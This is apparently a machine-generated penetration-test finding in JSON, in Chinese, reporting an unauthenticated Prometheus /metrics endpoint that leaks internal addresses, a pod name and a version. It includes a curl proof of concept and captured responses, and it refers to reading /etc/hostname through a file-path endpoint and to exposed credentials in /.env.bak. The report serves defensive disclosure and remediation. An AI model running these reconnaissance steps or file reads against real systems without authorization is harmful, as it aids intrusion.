+    "technical_analysis": "应用通过 Spring Boot Actuator 与 Micrometer 暴露 Prometheus 抓取端点，但 `/metrics` 未纳入任何授权过滤器：\n\n- 请求不携带 Cookie、Authorization 或特定 User-Agent 时直接返回 200，响应为 `text/plain; version=0.0.4` 的 Prometheus 格式。\n- 同一应用内的 `/actuator` 返回 403 并声明需要 level 3，`/admin` 同样 403，说明访问控制只施加在部分路径上，`/metrics` 属于遗漏项（与 `/actuator/env` 的子端点遗漏属同类实现问题，但路径与修复点不同）。\n- 指标标签直接内嵌基础设施标识：`nexus_db_pool_active{host=\"10.0.93.73:15432\"}`、`nexus_redis_up{host=\"10.0.93.73:16379\"}`、`nexus_up{pod=\"nexus-api-753bf81d-x3k3p\",version=\"2.4.1\"}`。这些值与 `/api/files?path=/etc/hostname` 返回的 Pod 名一致，可交叉确认目标运行形态。",
+    "poc_description": "1. 直接请求 `/metrics`，不携带任何认证头或 Cookie。\n2. 观察响应为 200 与 Prometheus 文本格式，其中包含 `nexus_build_info`、`nexus_db_pool_active`、`nexus_redis_up`、`nexus_up` 等指标。\n3. 从标签中提取内网数据库/缓存地址与端口、Pod 名称及版本号。\n4. 以 `/actuator`、`/admin` 的 403 响应作为对照，确认该端点被遗漏而非整体开放。",
+    "poc_script_code": "```bash\n# 未认证读取 Prometheus 指标\ncurl -sS -i \"http://10.0.93.73:18080/metrics\" | head -40\n\n# 提取内网地址、Pod 与版本\ncurl -sS \"http://10.0.93.73:18080/metrics\" \\\n  | grep -E 'nexus_(build_info|db_pool_active|redis_up|up)'\n\n# 对照：同主机受保护路径\nfor p in /actuator /admin; do\n  printf '%s -> ' \"$p\"\n  curl -sS -o /dev/null -w '%{http_code}\\n' \"http://10.0.93.73:18080$p\"\ndone\n```",
+    "remediation_steps": "1. 将 `/metrics` 从业务端口移除，改由独立管理端口提供并绑定到回环或内网地址。\n2. 若必须保留在同一端口，则在网关层对 `/metrics` 实施与 `/actuator` 一致（或更强）的认证与来源限制（mTLS、IP 白名单）。\n3. 清理指标标签中的内网地址与端口，改为逻辑实例名，避免把拓扑信息暴露给外部。\n4. 对全部非业务路径（`/metrics`、`/actuator/**`、`/debug`）建立统一的管理面暴露清单与回归测试，防止子路径遗漏。",
+    "evidence": "未认证请求返回 200（多次请求稳定为 10,246 字节）：\n\n```http\nGET /metrics HTTP/1.1\nHost: 10.0.93.73:18080\n\nHTTP/1.1 200 OK\nContent-Type: text/plain; version=0.0.4; charset=utf-8\n\n# HELP nexus_build_info build metadata\n# TYPE nexus_build_info gauge\nnexus_build_info{version=\"2.4.1\"} 1\n# HELP nexus_db_pool_active active connections\n# TYPE nexus_db_pool_active gauge\nnexus_db_pool_active{host=\"10.0.93.73:15432\"} 7\nnexus_redis_up{host=\"10.0.93.73:16379\"} 1\nnexus_up{pod=\"nexus-api-753bf81d-x3k3p\",version=\"2.4.1\"} 1\njvm_threads_live_threads 42\n```\n\n同主机上受保护路径的对照，说明保护策略未覆盖该端点：\n\n```http\nGET /actuator HTTP/1.1        -> 403 Forbidden (level 3 required)\nGET /admin    HTTP/1.1        -> 403 Forbidden\nGET /metrics  HTTP/1.1        -> 200 OK\n```",
+    "assumptions": "攻击者只需能访问 `10.0.93.73:18080`；不需要认证、Cookie 或特定来源。指标内容为拓扑与构建元数据，不含业务数据。",
+    "counterevidence": "Prometheus 指标在生产中有时被视为可观测性基础设施而非敏感面，且本端点只暴露聚合数值与标签，不含用户数据、令牌或请求内容。该反驳成立，因此定级为 Low 而非更高：泄露内容是内网 host:port、pod 名与版本号，属于侦察加速信息。但端点确实未做任何访问控制（同主机 `/admin`、`/actuator` 均 403，而 `/metrics` 直接 200），且 `/metrics` 中的 `nexus_db_pool_active{host=\"10.0.93.73:15432\"}` 与 `nexus_redis_up{host=\"10.0.93.73:16379\"}` 直接确认了后端端口，与 `/.env.bak` 的凭据形成组合利用面，因此仍按信息泄露上报而非忽略。",
+    "confidence": "high",
+    "confidence_rationale": "未认证返回 200 且内容稳定复现（多次请求同为 10,246 字节），泄露字段逐项可比对；仅\"该信息能否直接促成进一步攻击\"属推断，故按已证明的有限信息泄露定级。",
+    "severity_change_conditions": "若该端点进一步泄露凭据、请求内容或业务数据，应上调至 Medium/High；若确认指标已被网关鉴权覆盖或仅对回环开放，则降为 Informational。",
+    "fix_effort": "trivial",
+    "cvss": 3.7,
+    "cvss_breakdown": {
+      "attack_vector": "N",
+      "attack_complexity": "H",
+      "privileges_required": "N",
+      "user_interaction": "N",
+      "scope": "U",
+      "confidentiality": "L",
+      "integrity": "N",
+      "availability": "N"
+    },
+    "endpoint": "/metrics",
+    "method": "GET",
+    "cwe": "CWE-306",
+    "http_exchange_ids": [
+      "619",
+      "618",
+      "708"
+    ],
+    "finding_class": "dynamic",
+    "agent_id": "44f7e178",
+    "agent_name": "Report Reconciler"
+  }
+]
